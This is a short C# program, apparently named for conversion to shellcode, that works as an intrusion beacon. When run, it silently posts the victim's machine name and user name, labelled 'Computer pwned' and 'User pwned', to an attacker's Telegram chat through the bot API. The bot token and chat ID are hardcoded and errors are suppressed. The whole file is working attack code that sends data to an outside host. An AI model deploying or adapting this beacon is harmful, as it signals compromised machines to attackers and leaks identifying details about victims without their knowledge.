using System;
using System.Net.Http;
using System.Text;

namespace Managed_TelegramNotifyShellcode
{
    internal class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string url = "https://api.telegram.org/bot5876725645:AAEGt_hN-rV-Z8iPr9edvc7e7CtZ2QuSUrg/sendMessage";
                HttpClient client = new HttpClient();
                var requestData = new { key = "value" };
                string json = "{\"chat_id\": \"5073190288\", \"text\": \"Computer pwned: " + System.Environment.MachineName + "\nUser pwned : " + System.Environment.UserName + "\", \"disable_notification\": true}";
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var response = client.PostAsync(url, content);
                response.Wait();
            }
            catch (Exception ex)
            {
            }
        }
    }
}
